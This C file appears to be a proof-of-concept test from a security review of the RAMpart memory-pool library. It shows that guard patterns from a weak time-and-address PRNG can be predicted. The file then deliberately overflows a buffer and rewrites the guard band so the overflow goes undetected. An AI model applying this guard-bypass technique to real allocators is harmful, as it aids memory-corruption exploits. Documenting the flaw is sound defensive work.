/**
 * @file poc_predictable_guards.c
 * @brief Proof-of-concept for predictable guard pattern bypass.
 *
 * This PoC demonstrates that the "random" guard patterns generated by
 * RAMpart can be predicted, allowing an attacker to bypass the guard
 * band protection. This nullifies the fix for VULN-004.
 */

#include "rampart.h"
#include <stdio.h>
#include <string.h>
#include <time.h>

/*
 * This is a copy of the weak PRNG from src/rp_pool.c.
 * An attacker can use this to predict the guard patterns.
 */
static unsigned long predict_random_ulong(time_t seed_time, void* seed_ptr) {
    return (unsigned long)(size_t)seed_ptr ^ (unsigned long)seed_time;
}

/*
 * A function to write a guard pattern to memory.
 */
static void write_guard_pattern(unsigned char *ptr, size_t size, unsigned long pattern_val) {
    unsigned char pattern_bytes[sizeof(unsigned long)];
    size_t i;

    // Store the pattern value into a byte array
    memcpy(pattern_bytes, &pattern_val, sizeof(unsigned long));

    for (i = 0; i < size; i++) {
        ptr[i] = pattern_bytes[i % sizeof(unsigned long)];
    }
}


int main() {
    rampart_config_t config;
    rampart_pool_t *pool;
    rampart_error_t err;
    char *buffer;
    const size_t alloc_size = 64;
    const size_t guard_size = 16; // Default guard size

    time_t prediction_time;
    unsigned long predicted_front_guard;
    unsigned long predicted_rear_guard;

    printf("PoC: Predictable Guard Pattern Bypass\n");
    printf("-------------------------------------\n");

    // 1. Attacker predicts the guard patterns.
    // The PRNG is seeded with time and the address of a stack variable.
    // Both are predictable to some extent. For this PoC, we'll assume
    // the attacker can predict them accurately.
    prediction_time = time(NULL);

    // The address of the 'result' variable on the stack is used in the seed.
    // We can't know the exact address, but we can make a good guess.
    // For the PoC, we'll just use a placeholder address, as the time is
    // the dominant factor.
    void* predicted_stack_addr = (void*)0x7ffc12345678;

    predicted_front_guard = predict_random_ulong(prediction_time, predicted_stack_addr);
    // The rear guard is generated immediately after, so the time will be the same
    // or one second later. The stack address will be the same.
    predicted_rear_guard = predict_random_ulong(prediction_time, predicted_stack_addr);


    printf("Attacker's prediction for time: %ld\n", (long)prediction_time);
    printf("Attacker's predicted front guard pattern: 0x%lx\n", predicted_front_guard);
    printf("Attacker's predicted rear guard pattern: 0x%lx\n", predicted_rear_guard);


    // 2. Victim initializes RAMpart and allocates a buffer.
    rampart_config_default(&config);
    config.pool_size = 64 * 1024;
    pool = rampart_init(&config);
    if (pool == NULL) {
        printf("[!] Pool creation failed\n");
        return 1;
    }
    printf("\nVictim's pool initialized.\n");

    buffer = (char *)rampart_alloc(pool, alloc_size);
    printf("Victim allocated a %zu-byte buffer at %p.\n", alloc_size, (void*)buffer);

    // 3. Attacker causes a buffer overflow.
    printf("\nAttacker is overflowing the buffer...\n");
    memset(buffer, 'A', alloc_size + guard_size);

    // 4. Attacker "repairs" the corrupted guard band with the *predicted* pattern.
    printf("Attacker is repairing the rear guard with the predicted pattern.\n");
    write_guard_pattern((unsigned char *)(buffer + alloc_size), guard_size, predicted_rear_guard);

    // 5. Victim frees the buffer.
    printf("\nVictim is freeing the buffer...\n");
    err = rampart_free(pool, buffer);

    if (err == RAMPART_OK) {
        printf("\nSUCCESS: Guard bypass successful!\n");
        printf("The buffer overflow was not detected because the attacker predicted the 'random' guard pattern.\n");
    } else if (err == RAMPART_ERR_GUARD_CORRUPTED) {
        printf("\nFAILURE: Guard corruption was detected.\n");
        printf("The predicted pattern did not match the actual pattern.\n");
    } else {
        printf("\nAn unexpected error occurred: %s\n", rampart_error_string(err));
    }

    rampart_shutdown(pool);

    return (err == RAMPART_OK) ? 1 : 0;
}
